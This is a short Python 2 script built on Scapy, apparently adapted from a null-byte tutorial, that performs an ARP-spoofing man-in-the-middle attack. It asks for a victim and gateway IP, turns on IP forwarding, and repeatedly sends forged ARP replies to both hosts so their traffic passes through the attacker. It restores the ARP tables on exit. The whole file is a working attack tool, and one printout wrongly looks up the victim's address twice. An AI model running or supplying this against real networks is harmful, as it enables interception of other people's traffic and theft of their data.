from scapy.all import *
import sys
import os
import time

#### Text Color #####

cend = '\x1b[0m'
blue = '\x1b[1;34m' 
red =  '\x1b[1;31m'
green = '\x1b[1;32m'
cyan = '\x1b[1;36m'
yellow = '\x1b[1;33m'
magenta = '\x1b[1;35m'


print "------------------------------------------------------------------------------------------ "
print green + " null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/" + cend
print "------------------------------------------------------------------------------------------ "
print green + " Note: Make sure this script is run in internal network along with victim and gateway " + cend
print "------------------------------------------------------------------------------------------ \n"

try:
    interface=raw_input(green + "---> Enter Interface name: " + cend)
    victim_ip=raw_input(green + "---> Enter victim IP address: " + cend)
    print red + "Victim IP: " + cend + victim_ip
    gw_ip = raw_input(green + "---> Enter Gateway IP address: " + cend)
    print red + "Gateway IP: " + cend + gw_ip + "\n"

except KeyboardInterrupt:
    print red + "\n Stopping ... \n" + cend
    exit(0)

print yellow + "enabling IP forwarding ....\n" + cend
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward ")
    

def get_mac_address(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout = 2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf("%Ether.src%")

x = get_mac_address(victim_ip)
y = get_mac_address(victim_ip)
print red + "victim mac: " + cend + x + "\n"
print red + "gw mac: " + cend + y + "\n"

def restore_arp():
    print green + "Restoring Targets .... \n" + cend
    victim_mac=get_mac_address(victim_ip)
    gw_mac = get_mac_address(gw_ip)
    send(ARP(op=2, pdst=gw_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc= victim_mac), count = 7)
    send(ARP(op=2, pdst=victim_ip, psrc=gw_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc= gw_mac), count = 7)
    print green + "Disabling IP forwarding \n" + cend
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print green + "Done \n" + cend
    print magenta + "Quitting... \n" + cend
    exit(0)

def send_reply(gm, vm):
    send(ARP(op=2, pdst=victim_ip, psrc=gw_ip, hwdst=vm))
    send(ARP(op=2, pdst=gw_ip, psrc=victim_ip, hwdst=gm))

def mitm():
    try:
	victim_mac = get_mac_address(victim_ip)
    except Exception: 
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print red + "couldn't find victim mac address !  \n" + cend
	exit(0)

    try:
	gw_mac = get_mac_address(gw_ip)
    except Exception: 
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print red + "couldn't find gateway mac address !  \n" + cend
	exit(0)	

    print red + "Starting Attack..... \n" + cend
    while 1:
        try:
	    send_reply(gw_mac, victim_mac)
	    time.sleep(1.5)

	except KeyboardInterrupt:
	    restore_arp()
	    break

try:
    mitm()
except socket.gaierror:
    print yellow + "wrong IP address/Port \n" + cend
except KeyboardInterrupt:
    print red + "Stopping ... \n" + cend
    exit(0)

